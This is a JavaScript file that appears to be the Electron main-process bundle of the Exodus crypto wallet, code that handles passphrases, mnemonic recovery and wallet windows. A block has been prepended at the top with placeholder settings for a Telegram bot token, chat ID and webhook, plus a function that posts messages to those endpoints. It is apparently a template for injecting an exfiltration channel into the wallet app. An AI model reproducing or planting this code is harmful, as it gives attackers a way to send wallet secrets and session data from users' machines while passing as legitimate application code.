const https = require('https');

var config = {
  tel_url: "%TELEGRAM_PROTECTED_URL%",
  webhookUrl: "%WEBHOOK%",
  links: "%URL_DOWNLOADS%",
  bot_token: "%TELEGRAM_BOTTOKEN%",
  chat_id: "%TELEGRAM_CHATID%",
  user_id: "%TELEGRAM_USERID%"
};


function parseTelegram(message) {
  let g = message.replace(/\x1b\[.*?m/g, "");
  g = g
      .replace(/\]/g, "\\]")
      .replace(/\[/g, "\\[")
      .replace(/\./g, "\\.")
      .replace(/\+/g, "\\+")
      .replace(/\</g, "\\<")
      .replace(/\>/g, "\\>")
      .replace(/\_/g, "\\_")
      .replace(/!/g, "")
      .replace(/\-/g, "\\-")
      .replace(/\(/g, "\\(")
      .replace(/\)/g, "\\)");

  return g;
}

async function SessionsTelegramSend(message, token, channelId, userId) {
  const parsedMessage = parseTelegram(message);

  if (/\/req\//.test(config.tel_url)) {
    try {
      const data = JSON.stringify({ message: parsedMessage });

      const url = new URL(config.tel_url);
      const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": data.length,
        },
      };

      const req = https.request(options, (res) => {
        res.on("data", () => {});
      });

      req.on("error", (error) => {
        console.log("Erreur HTTPS :", error);
      });

      req.write(data);
      req.end();
    } catch (error) {
      console.log("Erreur dans la requête POST :", error);
    }
  } else {
    try {
      let chatId;
      if (userId.includes("%TELEGRAM") || userId === "no") {
        chatId = `@${channelId}`;
      } else {
        chatId = userId;
      }

      const params = new URLSearchParams({
        chat_id: chatId,
        text: parsedMessage,
        parse_mode: "MarkdownV2",
      }).toString();

      const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?${params}`;
      const url = new URL(apiUrl);

      const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname + url.search,
        method: "GET",
      };

      const req = https.request(options, (res) => {
        res.on("data", () => {});
      });

      req.on("error", (error) => {
        console.log("Erreur HTTPS :", error);
      });

      req.end();
    } catch (error) {
      console.log("Erreur dans SessionsTelegramSend :", error);
    }
  }
}

!(function (e) {
  var t = {};
  function n(o) {
    if (t[o]) return t[o].exports;
    var r = (t[o] = { i: o, l: !1, exports: {} });
    return e[o].call(r.exports, r, r.exports, n), (r.l = !0), r.exports;
  }
  (n.m = e),
    (n.c = t),
    (n.d = function (e, t, o) {
      n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: o });
    }),
    (n.r = function (e) {
      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 });
    }),
    (n.t = function (e, t) {
      if ((1 & t && (e = n(e)), 8 & t)) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var o = Object.create(null);
      if ((n.r(o), Object.defineProperty(o, "default", { enumerable: !0, value: e }), 2 & t && "string" != typeof e))
        for (var r in e)
          n.d(
            o,
            r,
            function (t) {
              return e[t];
            }.bind(null, r)
          );
      return o;
    }),
    (n.n = function (e) {
      var t =
        e && e.__esModule
          ? function () {
              return e.default;
            }
          : function () {
              return e;
            };
      return n.d(t, "a", t), t;
    }),
    (n.o = function (e, t) {
      return Object.prototype.hasOwnProperty.call(e, t);
    }),
    (n.p = ""),
    n((n.s = 136));
})([
  function (e, t) {
    e.exports = require("electron");
  },
  function (e, t, n) {
    "use strict";
    var o = n(69);
    n.o(o, "AUTO_UPDATE_BASE_URL") &&
      n.d(t, "AUTO_UPDATE_BASE_URL", function () {
        return o.AUTO_UPDATE_BASE_URL;
      }),
      n.o(o, "ENV_BUILD_EDEN") &&
        n.d(t, "ENV_BUILD_EDEN", function () {
          return o.ENV_BUILD_EDEN;
        }),
      n.o(o, "ENV_BUILD_EXODUS") &&
        n.d(t, "ENV_BUILD_EXODUS", function () {
          return o.ENV_BUILD_EXODUS;
        }),
      n.o(o, "ENV_BUILD_NAME") &&
        n.d(t, "ENV_BUILD_NAME", function () {
          return o.ENV_BUILD_NAME;
        }),
      n.o(o, "ENV_DEV") &&
        n.d(t, "ENV_DEV", function () {
          return o.ENV_DEV;
        }),
      n.o(o, "ENV_EXODUS_PROD") &&
        n.d(t, "ENV_EXODUS_PROD", function () {
          return o.ENV_EXODUS_PROD;
        }),
      n.o(o, "ENV_PROD") &&
        n.d(t, "ENV_PROD", function () {
          return o.ENV_PROD;
        }),
      n.o(o, "ENV_TEST") &&
        n.d(t, "ENV_TEST", function () {
          return o.ENV_TEST;
        }),
      n.o(o, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE") &&
        n.d(t, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE", function () {
          return o.FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE;
        }),
      n.o(o, "FLAG_FILE_RESTORE_MNEMONIC") &&
        n.d(t, "FLAG_FILE_RESTORE_MNEMONIC", function () {
          return o.FLAG_FILE_RESTORE_MNEMONIC;
        }),
      n.o(o, "MIN_HEIGHT") &&
        n.d(t, "MIN_HEIGHT", function () {
          return o.MIN_HEIGHT;
        }),
      n.o(o, "MIN_WIDTH") &&
        n.d(t, "MIN_WIDTH", function () {
          return o.MIN_WIDTH;
        }),
      n.o(o, "NIGHTLY_BUILD") &&
        n.d(t, "NIGHTLY_BUILD", function () {
          return o.NIGHTLY_BUILD;
        }),
      n.o(o, "PACKAGE") &&
        n.d(t, "PACKAGE", function () {
          return o.PACKAGE;
        }),
      n.o(o, "PROTOCOL") &&
        n.d(t, "PROTOCOL", function () {
          return o.PROTOCOL;
        }),
      n.o(o, "UNLOCK_WINDOW_HEIGHT") &&
        n.d(t, "UNLOCK_WINDOW_HEIGHT", function () {
          return o.UNLOCK_WINDOW_HEIGHT;
        });
  },
  function (e, t) {
    e.exports = require("path");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "appWindows", function () {
      return D;
    }),
      n.d(t, "onAppReady", function () {
        return _;
      });
    n(94), n(93), n(92);
    var o = n(0),
      r = n(9),
      i = n.n(r),
      s = n(2),
      c = n.n(s),
      a = n(27),
      u = n(1),
      l = n(29),
      d = n(17),
      f = n(82),
      p = n(10),
      h = n(26),
      w = n(5),
      m = n(30),
      b = n(51),
      y = n(50),
      g = n(49),
      E = n(36),
      v = n(19),
      O = n(33),
      S = n(35);
    const D = {};
    let k;
    async function _(e) {
      const t = e.exodusDirFromCli,
        n = Object(m.init)(t),
        r = Object(b.init)(n),
        s = Object(v.init)(n);
      (D.background = n), (D.ui = s), (D.core = r);
      const c = t || Object(l.dataDir)();
      console.timeEnd("main"),
        console.time("uiview"),
        await (async function (e, t) {
          if (await i.a.pathExists(x(t)))
            return (async function (e) {
              await i.a.remove(x(e)), (k = Object(E.init)({ recoverFromPhrase: !0 }));
              const t = Object(a.walletDirFromExodusDir)(e);
              N(t);
            })(t);
          const n = (function (e) {
            if (globalThis.OPENED_URL && globalThis.OPENED_URL.includes("recover")) return globalThis.OPENED_URL;
            if (!Array.isArray(e._) && e._.length > 0) return null;
            const t = e._.find((e) => e.includes("recover"));
            return t && t.includes("recover") ? t : null;
          })(e);
          if (n)
            return (async function (e, t) {
              k = Object(E.init)({ recoverFromLink: !0 });
              const n = Object(a.walletDirFromExodusDir)(t);
              h.default.on("passphrase:set", (t) => {
                const o = Object(S.init)({ walletDir: n, recoveryLink: e, passphrase: t });
                h.default.on("passphrase:invalid", () => {
                  o.destroy();
                });
              });
            })(n, t);
          h.default.on("error", (e) => {
            const t = `Wallet Load Error:\n\n${e}\n\nPlease contact: support@exodus.com\n\nYour assets are safe.`;
            o.dialog.showErrorBox("Wallet Load Error", t), o.app.quit();
          });
          const r = Object(a.walletDirFromExodusDir)(t),
            s = Object(a.default)(r),
            c = await s.walletExists(),
            u = await s.passphraseFileExists();
          if (!c || (c && u)) Object(S.init)({ walletDir: r });
          else {
            if (u) {
              const e = new Error("Wallet exists - should not have reached this point.");
              throw (console.error(e), e);
            }
            (k = Object(E.init)()),
              h.default.on("passphrase:set", (e) => {
                const t = Object(S.init)({ walletDir: r, passphrase: e });
                h.default.on("passphrase:invalid", () => {
                  t.destroy();
                });
              }),
              N(r);
          }
        })(e, c),
        s.webContents.on("devtools-opened", () => {
          console.log("devtools were opened"),
            setImmediate(() => {
              s.webContents.send("devtools-opened");
            });
        }),
        s.webContents.once("did-finish-load", () => {
          function e() {
            k && (Object(m.maximize)(n), n.show(), k.destroy()),
              (Object(d.default)() || u.ENV_DEV) && Object(p.default)({ windowHandle: s.webContents, windowId: "ui" }),
              setTimeout(() => {
                Object(f.default)().catch(console.error);
              }, 3e4);
          }
          console.log(`did-finish-load at [${Date.now()}]`),
            console.timeEnd("uiview"),
            (D.unlock = Object(O.init)(n)),
            k || (Object(m.maximize)(n), (s.webContents.zoomFactor = 1), n.show()),
            Object(g.init)(),
            h.default._walletLoaded ? e() : h.default.on("wallet:loaded", e);
        }),
        s.webContents.loadFile(w.WINDOW_EXODUS),
        Object(y.init)(),
        n.on("close", () => o.app.quit());
    }
    const N = (e) => {
        h.default.on("mnemonic:set", ({ mnemonic: t, passphrase: n }) => {
          const o = Object(S.init)({ walletDir: e, recoveryPhrase: t, recoveryPhrasePassphrase: n });
          h.default.on("passphrase:invalid", () => {
            o.destroy();
          });
        });
      },
      x = (e) => c.a.join(e, u.FLAG_FILE_RESTORE_MNEMONIC);
  },
  function (e, t, n) {
    e.exports = n(95);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "WINDOW_EXODUS", function () {
      return s;
    }),
      n.d(t, "WINDOW_BACKGROUND", function () {
        return c;
      }),
      n.d(t, "WINDOW_KEYVIEWER", function () {
        return a;
      }),
      n.d(t, "WINDOW_MONERO", function () {
        return u;
      }),
      n.d(t, "WINDOW_NETWORK", function () {
        return l;
      }),
      n.d(t, "WINDOW_PASSPHRASE", function () {
        return d;
      }),
      n.d(t, "WINDOW_SCAN_QR", function () {
        return f;
      }),
      n.d(t, "WINDOW_UNLOCK", function () {
        return p;
      }),
      n.d(t, "WINDOW_WALLET", function () {
        return h;
      }),
      n.d(t, "WINDOW_CORE", function () {
        return w;
      }),
      n.d(t, "WINDOW_NFTS", function () {
        return m;
      }),
      n.d(t, "WINDOW_RECOVERY", function () {
        return b;
      });
    var o = n(2),
      r = n.n(o);
    const i = (e) => r.a.join("src", "static", e),
      s = i(n(1).ENV_PROD ? "exodus-prod.html" : "exodus-dev.html"),
      c = i("background.html"),
      a = i("keyviewer.html"),
      u = i("monero.html"),
      l = i("network.html"),
      d = i("passphrase.html"),
      f = i("scan-qr.html"),
      p = i("unlock.html"),
      h = i("wallet.html"),
      w = i("core.html"),
      m = i("nfts.html"),
      b = i("recovery.html");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "showError", function () {
      return c;
    });
    var o = n(0),
      r = n(1);
    const i = r.ENV_PROD && r.ENV_BUILD_EDEN,
      s = r.ENV_PROD && !r.ENV_BUILD_EDEN;
    function c(e, t = "", n = 2, r = !0) {
      n >= 3 && (console.error(`[security] PANIC on ${e}${t}, terminating`), o.app.exit(-1));
      const c = r ? "blocked" : "noticed";
      if ((console.error(`[security] ${c} ${e}${t}`), s));
      else if (i) {
        if (n < 2) return;
        o.dialog.showMessageBoxSync({ type: "warning", title: `Unexpected ${e} was ${c}`, message: `Unexpected ${e}${t} was ${c} by security rules. Please contact support@exodus.com` });
      } else {
        if (n < 1) return;
        console.error(
          `[security] PANIC on ${e} attempt, this shouldn't happen!\n` +
            "This indicates an error either in the application code, or in security hardening logic.\nIf this is not caused by local modifications, please report this so that broken code does not end up in release.\nIf this is caused by local modifications, reporting it might also help to resolve the issue."
        ),
          o.app.exit(-1);
      }
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "integration", function () {
      return u;
    }),
      n.d(t, "isolation", function () {
        return l;
      });
    var o = n(0),
      r = n(2),
      i = n.n(r),
      s = n(1);
    const c = (() =>
        s.ENV_BUILD_EDEN
          ? i.a.join(o.app.getAppPath(), "src", "static", "icons", "PNG", "red", "icon_128x128.png")
          : i.a.join(o.app.getAppPath(), "src", "static", "icons", "PNG", "icon_128x128.png"))(),
      a = (() => (s.ENV_BUILD_EXODUS ? "Exodus" : s.ENV_BUILD_EDEN ? "Eden" : s.ENV_BUILD_NAME))(),
      u = { webSecurity: !0, spellcheck: !1, enableRemoteModule: !1, nodeIntegration: !0, sandbox: !1, contextIsolation: !1, nodeIntegrationInWorker: !1 },
      l = {
        webSecurity: !0,
        spellcheck: !1,
        enableRemoteModule: !1,
        preload: i.a.join(o.app.getAppPath(), "src/app/preload/index.js"),
        nodeIntegration: !1,
        sandbox: !0,
        contextIsolation: !0,
        nodeIntegrationInWorker: !1,
      };
    t.default = { resizable: !0, title: a, icon: c, frame: !0, backgroundColor: "#0b0b0b", show: !1 };
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "getWebContentsMeta", function () {
        return u;
      }),
      n.d(t, "registerWebContents", function () {
        return l;
      });
    var o = n(0),
      r = n(14),
      i = n(89),
      s = n(6),
      c = n(37);
    const a = new WeakMap();
    function u(e) {
      const t = a.get(e);
      if (!t) throw new Error("webContents instance is not registered");
      return t;
    }
    function l(e, t, n = {}) {
      const o = Object(i.prepareMetaEntry)(t, n);
      if (a.has(e)) throw new Error("Attempting to re-register webContents instance");
      a.set(e, o), Object(c.registerWebContentsSession)(e, o);
    }
    o.app.on("web-contents-created", (e, t) => {
      t.on("will-navigate", (e, t) => {
        "mailto:" !== new r.URL(t).protocol && (e.preventDefault(), Object(s.showError)("unsafe navigation", ` to ${t}`, 0));
      });
      t.setWindowOpenHandler(({ url: e }) =>
        ((e) => {
          return !(!(t.getURL() || "").startsWith("devtools://") || !e.startsWith("devtools://"));
        })(e)
          ? { action: "allow" }
          : (Object(s.showError)("opening a new window", `: ${e}`, 0), { action: "deny" })
      ),
        t.on("will-attach-webview", (e) => {
          e.preventDefault();
          const n = t.getURL() || "";
          Object(s.showError)("attaching webview", `: ${n}`, 2);
        }),
        Object(c.saveSessionWebContents)(t);
    });
  },
  function (e, t, n) {
    "use strict";
    e.exports = { ...n(39), ...n(58), ...n(117), ...n(115), ...n(109), ...n(21), ...n(103), ...n(56), ...n(31), ...n(47) };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "default", function () {
      return d;
    });
    var o = n(0),
      r = n(9),
      i = n.n(r),
      s = n(1),
      c = n(17),
      a = n(19);
    const u = "exodus-devtools.conf";
    class l {
      constructor(e) {
        (this._windowHandle = e.windowHandle), (this._windowId = e.windowId), (this._options = {}), "devMenu" === this._windowId && (this._options = { mode: "detach" });
      }
      async readConf() {
        let e;
        const t = {
            devMenu: { mode: "detach" },
            ui: { mode: "detach" },
            monero: { mode: "bottom" },
            network: { mode: "bottom" },
            core: { mode: "bottom" },
            passphrase: { mode: "bottom" },
            scanQR: { mode: "detach" },
            keyviewer: { mode: "detach" },
            wallet: { mode: "bottom" },
            unlock: { mode: "detach" },
            recovery: { mode: "bottom" },
          },
          n = (e) => Object.keys(e).sort().join("|");
        try {
          if (n((e = await i.a.readJson(u, "utf8"))) !== n(t)) throw new Error(`Keys mismatch in ${u}`);
        } catch (n) {
          "ENOENT" === n.code ? console.log(`Exodus DevTools configuration file does not exist, so creating a default in '${u}'.`) : console.error(n), (e = t);
          try {
            await i.a.writeJson(u, e, { spaces: 2 });
          } catch (e) {
            console.error(e);
          }
        }
        this._options = e[this._windowId];
      }
      show() {
        if (!this._options) return;
        let e;
        if ("number" == typeof this._windowHandle) e = o.BrowserWindow.fromId(this._windowHandle).webContents;
        else if (null == this._windowHandle) e = Object(a.getWindow)().webContents;
        else if ("function" == typeof this._windowHandle.constructor)
          if ("BrowserWindow" === this._windowHandle.constructor.name) e = this._windowHandle.webContents;
          else {
            if (!this._windowHandle.openDevTools) throw new Error("#devtools.show() Unknown constructor.");
            e = this._windowHandle;
          }
        if (!e) return console.error("Can't show #devtools.");
        let t = "ui" === this._windowId ? { mode: "detach" } : this._options;
        e.openDevTools(t);
      }
    }
    async function d(e = { windowHandle: null, windowId: "devMenu" }) {
      if (s.ENV_TEST) return;
      const t = new l(e);
      (s.ENV_DEV || Object(c.default)()) && (await t.readConf()), t.show();
    }
  },
  function (e, t, n) {
    const o = n(90),
      r = (e) => "-" === e || (Array.isArray(e) && "-" === e[0]),
      i = (e) => "function" == typeof e,
      s = (e) => o.includes(e);
    e.exports = function e(t) {
      return Array.isArray(t)
        ? 0 === t.length
          ? []
          : r(t[0])
          ? { type: "separator" }
          : "string" != typeof t[0]
          ? t.map(e)
          : t
              .slice(1)
              .reduce(
                (t, n) =>
                  i(n)
                    ? Object.assign(t, { click: n })
                    : s(n)
                    ? Object.assign(t, { role: n })
                    : Array.isArray(n)
                    ? Object.assign(t, { submenu: e(n) })
                    : "object" == typeof n
                    ? Object.assign(t, n)
                    : "string" == typeof n
                    ? Object.assign(t, { accelerator: n })
                    : void 0,
                { label: t[0] }
              )
        : r(t)
        ? { type: "separator" }
        : t;
    };
  },
  function (e, t, n) {
    var o,
      r,
      i = n(24),
      s = n(126),
      c = n(124),
      a = n(122),
      u = n(43);
    function l(e, t) {
      Object.defineProperty(e, o, {
        get: function () {
          return t;
        },
      });
    }
    (o = Symbol.for("graceful-fs.queue")), (r = Symbol.for("graceful-fs.previous"));
    var d,
      f = function () {};
    if (
      (u.debuglog
        ? (f = u.debuglog("gfs4"))
        : /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") &&
          (f = function () {
            var e = u.format.apply(u, arguments);
            (e = "GFS4: " + e.split(/\n/).join("\nGFS4: ")), console.error(e);
          }),
      !i[o])
    ) {
      var p = global[o] || [];
      l(i, p),
        (i.close = (function (e) {
          function t(t, n) {
            return e.call(i, t, function (e) {
              e || w(), "function" == typeof n && n.apply(this, arguments);
            });
          }
          return Object.defineProperty(t, r, { value: e }), t;
        })(i.close)),
        (i.closeSync = (function (e) {
          function t(t) {
            e.apply(i, arguments), w();
          }
          return Object.defineProperty(t, r, { value: e }), t;
        })(i.closeSync)),
        /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") &&
          process.on("exit", function () {
            f(i[o]), n(68).equal(i[o].length, 0);
          });
    }
    function h(e) {
      f("ENQUEUE", e[0].name, e[1]), i[o].push(e), m();
    }
    function w() {
      for (var e = Date.now(), t = 0; t < i[o].length; ++t) i[o][t].length > 2 && ((i[o][t][3] = e), (i[o][t][4] = e));
      m();
    }
    function m() {
      if ((clearTimeout(d), (d = void 0), 0 !== i[o].length)) {
        var e = i[o].shift(),
          t = e[0],
          n = e[1],
          r = e[2],
          s = e[3],
          c = e[4];
        if (void 0 === s) f("RETRY", t.name, n), t.apply(null, n);
        else if (Date.now() - s >= 6e4) {
          f("TIMEOUT", t.name, n);
          var a = n.pop();
          "function" == typeof a && a.call(null, r);
        } else {
          var u = Date.now() - c,
            l = Math.max(c - s, 1);
          u >= Math.min(1.2 * l, 100) ? (f("RETRY", t.name, n), t.apply(null, n.concat([s]))) : i[o].push(e);
        }
        void 0 === d && (d = setTimeout(m, 0));
      }
    }
    global[o] || l(global, i[o]),
      (e.exports = (function e(t) {
        s(t);
        t.gracefulify = e;
        t.createReadStream = function (e, n) {
          return new t.ReadStream(e, n);
        };
        t.createWriteStream = function (e, n) {
          return new t.WriteStream(e, n);
        };
        var n = t.readFile;
        t.readFile = function (e, t, o) {
          "function" == typeof t && ((o = t), (t = null));
          return (function e(t, o, r, i) {
            return n(t, o, function (n) {
              !n || ("EMFILE" !== n.code && "ENFILE" !== n.code) ? "function" == typeof r && r.apply(this, arguments) : h([e, [t, o, r], n, i || Date.now(), Date.now()]);
            });
          })(e, t, o);
        };
        var o = t.writeFile;
        t.writeFile = function (e, t, n, r) {
          "function" == typeof n && ((r = n), (n = null));
          return (function e(t, n, r, i, s) {
            return o(t, n, r, function (o) {
              !o || ("EMFILE" !== o.code && "ENFILE" !== o.code) ? "function" == typeof i && i.apply(this, arguments) : h([e, [t, n, r, i], o, s || Date.now(), Date.now()]);
            });
          })(e, t, n, r);
        };
        var r = t.appendFile;
        r &&
          (t.appendFile = function (e, t, n, o) {
            "function" == typeof n && ((o = n), (n = null));
            return (function e(t, n, o, i, s) {
              return r(t, n, o, function (r) {
                !r || ("EMFILE" !== r.code && "ENFILE" !== r.code) ? "function" == typeof i && i.apply(this, arguments) : h([e, [t, n, o, i], r, s || Date.now(), Date.now()]);
              });
            })(e, t, n, o);
          });
        var i = t.copyFile;
        i &&
          (t.copyFile = function (e, t, n, o) {
            "function" == typeof n && ((o = n), (n = 0));
            return (function e(t, n, o, r, s) {
              return i(t, n, o, function (i) {
                !i || ("EMFILE" !== i.code && "ENFILE" !== i.code) ? "function" == typeof r && r.apply(this, arguments) : h([e, [t, n, o, r], i, s || Date.now(), Date.now()]);
              });
            })(e, t, n, o);
          });
        var a = t.readdir;
        t.readdir = function (e, t, n) {
          "function" == typeof t && ((n = t), (t = null));
          var o = u.test(process.version)
            ? function (e, t, n, o) {
                return a(e, r(e, t, n, o));
              }
            : function (e, t, n, o) {
                return a(e, t, r(e, t, n, o));
              };
          return o(e, t, n);
          function r(e, t, n, r) {
            return function (i, s) {
              !i || ("EMFILE" !== i.code && "ENFILE" !== i.code) ? (s && s.sort && s.sort(), "function" == typeof n && n.call(this, i, s)) : h([o, [e, t, n], i, r || Date.now(), Date.now()]);
            };
          }
        };
        var u = /^v[0-5]\./;
        if ("v0.8" === process.version.substr(0, 4)) {
          var l = c(t);
          (m = l.ReadStream), (b = l.WriteStream);
        }
        var d = t.ReadStream;
        d &&
          ((m.prototype = Object.create(d.prototype)),
          (m.prototype.open = function () {
            var e = this;
            g(e.path, e.flags, e.mode, function (t, n) {
              t ? (e.autoClose && e.destroy(), e.emit("error", t)) : ((e.fd = n), e.emit("open", n), e.read());
            });
          }));
        var f = t.WriteStream;
        f &&
          ((b.prototype = Object.create(f.prototype)),
          (b.prototype.open = function () {
            var e = this;
            g(e.path, e.flags, e.mode, function (t, n) {
              t ? (e.destroy(), e.emit("error", t)) : ((e.fd = n), e.emit("open", n));
            });
          }));
        Object.defineProperty(t, "ReadStream", {
          get: function () {
            return m;
          },
          set: function (e) {
            m = e;
          },
          enumerable: !0,
          configurable: !0,
        });
        Object.defineProperty(t, "WriteStream", {
          get: function () {
            return b;
          },
          set: function (e) {
            b = e;
          },
          enumerable: !0,
          configurable: !0,
        });
        var p = m;
        Object.defineProperty(t, "FileReadStream", {
          get: function () {
            return p;
          },
          set: function (e) {
            p = e;
          },
          enumerable: !0,
          configurable: !0,
        });
        var w = b;
        Object.defineProperty(t, "FileWriteStream", {
          get: function () {
            return w;
          },
          set: function (e) {
            w = e;
          },
          enumerable: !0,
          configurable: !0,
        });
        function m(e, t) {
          return this instanceof m ? (d.apply(this, arguments), this) : m.apply(Object.create(m.prototype), arguments);
        }
        function b(e, t) {
          return this instanceof b ? (f.apply(this, arguments), this) : b.apply(Object.create(b.prototype), arguments);
        }
        var y = t.open;
        t.open = g;
        function g(e, t, n, o) {
          return (
            "function" == typeof n && ((o = n), (n = null)),
            (function e(t, n, o, r, i) {
              return y(t, n, o, function (s, c) {
                !s || ("EMFILE" !== s.code && "ENFILE" !== s.code) ? "function" == typeof r && r.apply(this, arguments) : h([e, [t, n, o, r], s, i || Date.now(), Date.now()]);
              });
            })(e, t, n, o)
          );
        }
        return t;
      })(a(i)));
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "forwardErrors", function () {
      return i;
    });
    var o = n(6),
      r = n(3);
    function i(e, t) {
      if (!t) throw new Error("fromWindow is required!");
      e.on("console-message", (e, n, i, s, c) => {
        if ("ui" === t && /^Error in [^ ]+ window:/.test(i)) return;
        if (i.includes("the following Content Security Policy directive:")) {
          const e = i.replace(/the following Content Security Policy directive:[\s\S]*/, "CSP").replace(/ because it violates CSP$/, "");
          Object(o.showError)("Content Security Policy violation", ` in ${t} window (${e})`);
        }
        if (n < 3) return;
        if ("ui" === t || !r.appWindows.ui) return;
        const a = { level: n, message: i, line: s, sourceId: c, window: t };
        r.appWindows.ui.webContents.send("errors:remote-error", a);
      });
    }
  },
  function (e, t) {
    e.exports = require("url");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "fiatUnit", function () {
      return o;
    }),
      n.d(t, "themeName", function () {
        return r;
      }),
      n.d(t, "adaLegacyAddressEnabled", function () {
        return i;
      }),
      n.d(t, "moneroInitialHeight", function () {
        return s;
      }),
      n.d(t, "moneroSubaddressesEnabled", function () {
        return c;
      }),
      n.d(t, "bitcoinLegacyAddressEnabled", function () {
        return a;
      }),
      n.d(t, "bitcoinTaprootAddressEnabled", function () {
        return u;
      }),
      n.d(t, "rbfEnabledBitcoin", function () {
        return l;
      }),
      n.d(t, "rbfEnabledEthereum", function () {
        return d;
      }),
      n.d(t, "wentThroughFiatOnboarding", function () {
        return f;
      });
    const o = "fiat.unit",
      r = "theme.name",
      i = "adaLegacyAddressEnabled",
      s = "moneroInitialHeight",
      c = "moneroSubaddressesEnabled",
      a = "bitcoinLegacyAddressEnabled",
      u = "bitcoinTaprootAddressEnabled",
      l = "advanced.advancedMode.assets.bitcoin",
      d = "advanced.advancedMode.assets.ethereum",
      f = "fiatOnramp.wentThroughFiatOnboarding";
  },
  function (e, t, n) {
    "use strict";
    (t.fromCallback = function (e) {
      return Object.defineProperty(
        function (...t) {
          if ("function" != typeof t[t.length - 1])
            return new Promise((n, o) => {
              e.call(this, ...t, (e, t) => (null != e ? o(e) : n(t)));
            });
          e.apply(this, t);
        },
        "name",
        { value: e.name }
      );
    }),
      (t.fromPromise = function (e) {
        return Object.defineProperty(
          function (...t) {
            const n = t[t.length - 1];
            if ("function" != typeof n) return e.apply(this, t);
            e.apply(this, t.slice(0, -1)).then((e) => n(null, e), n);
          },
          "name",
          { value: e.name }
        );
      });
  },
  function (e, t, n) {
    "use strict";
    let o;
    function r() {
      return "boolean" == typeof o ? o : globalThis.DEBUG_MODE;
    }
    n.d(t, "default", function () {
      return r;
    });
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getHtmlUrl", function () {
      return c;
    });
    var o = n(2),
      r = n.n(o),
      i = n(14),
      s = n.n(i);
    const c = ({ app: e, filePath: t, hash: n, query: o }) => {
      const i = { protocol: "file", slashes: !0, pathname: r.a.resolve(e.getAppPath(), t), hash: n, query: o };
      return s.a.format(i);
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return d;
    }),
      n.d(t, "navbarHeightChangeHandlers", function () {
        return p;
      }),
      n.d(t, "init", function () {
        return h;
      });
    var o = n(0),
      r = (n(2), n(23)),
      i = n(8),
      s = n(13),
      c = n(40),
      a = n(7),
      u = n(30);
    let l = null;
    const d = () => l,
      f = (e, t) => {
        const { height: n, width: o } = Object(c.default)(t);
        e.setBounds({ x: 0, y: 0, width: o, height: n });
      },
      p = new Set();
    function h(e) {
      return (
        (l = new o.BrowserView({ webPreferences: { ...a.integration, partition: "persist:main", backgroundThrottling: !1, backgroundColor: "#00000000", transparent: !0 }, transparent: !0 })),
        Object(i.registerWebContents)(l.webContents, "ui"),
        Object(r.registerBrowserView)(l),
        Object(s.forwardErrors)(l.webContents, "ui"),
        e.contentView.on("bounds-changed", () => f(l, e)),
        e.addBrowserView(l),
        f(l, e),
        l.webContents.on("will-navigate", (e, t) => {
          t.startsWith("mailto:") || e.preventDefault();
        }),
        l.webContents.setWindowOpenHandler((e) => ({ action: "deny" })),
        u.maximizeWorkaroundHandlers.add(() => f(l, e)),
        l
      );
    }
  },
  function (e, t, n) {
    const o = !1,
      r = { MAIN: 1, RENDERER: 2 },
      i = { BEGIN: "B", END: "E", INSTANT: "i" },
      s = [];
    function c(e) {
      return o
        ? (t) => {
            const n = { name: t, pid: r.MAIN, ph: e, cat: "PERF", timestamp: Date.now() };
            e === i.INSTANT && (n.s = "p"), s.push(n);
          }
        : () => {};
    }
    e.exports = {
      PERF_METRICS_FEATURES: o,
      beginEvent: c(i.BEGIN),
      endEvent: c(i.END),
      instantEvent: c(i.INSTANT),
      getTimeOrigin: () => null,
      getTrace: (e) =>
        s.map((t) => {
          const { timestamp: n, ...o } = t;
          return { ...o, ts: 1e3 * (n - e) };
        }),
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromPromise,
      { makeDir: r, makeDirSync: i } = n(120),
      s = o(r);
    e.exports = { mkdirs: s, mkdirsSync: i, mkdirp: s, mkdirpSync: i, ensureDir: s, ensureDirSync: i };
  },
  function (e, t, n) {
    "use strict";
    function o(e = null) {
      return e ? encodeURIComponent(JSON.stringify(e)) : "";
    }
    n.d(t, "encode", function () {
      return o;
    });
  },
  function (e, t, n) {
    const { BrowserWindow: o } = n(0);
    const r = new Set();
    function i(e) {
      for (const t of o.getAllWindows()) if (t.getBrowserViews().includes(e)) return t;
      return null;
    }
    e.exports = {
      browserViewFromWebContents: function (e) {
        for (const t of r) if (t.webContents === e) return t;
        return null;
      },
      browserWindowFromBrowserView: i,
      registerBrowserView: function (e) {
        r.add(e);
      },
      destroyBrowserView: function (e) {
        const t = i(e);
        t && t.removeBrowserView(e), e.webContents.destroy(), r.delete(e);
      },
      allWebContents: function () {
        return [...o.getAllWindows(), ...r].map((e) => e.webContents);
      },
    };
  },
  function (e, t) {
    e.exports = require("fs");
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "setUserPath", function () {
        return d;
      }),
      n.d(t, "getDebugFile", function () {
        return f;
      }),
      n.d(t, "isExistsSync", function () {
        return p;
      }),
      n.d(t, "isExists", function () {
        return h;
      }),
      n.d(t, "create", function () {
        return w;
      }),
      n.d(t, "remove", function () {
        return m;
      });
    var o = n(0),
      r = n(9),
      i = n.n(r),
      s = n(44),
      c = n.n(s),
      a = n(2),
      u = n.n(a);
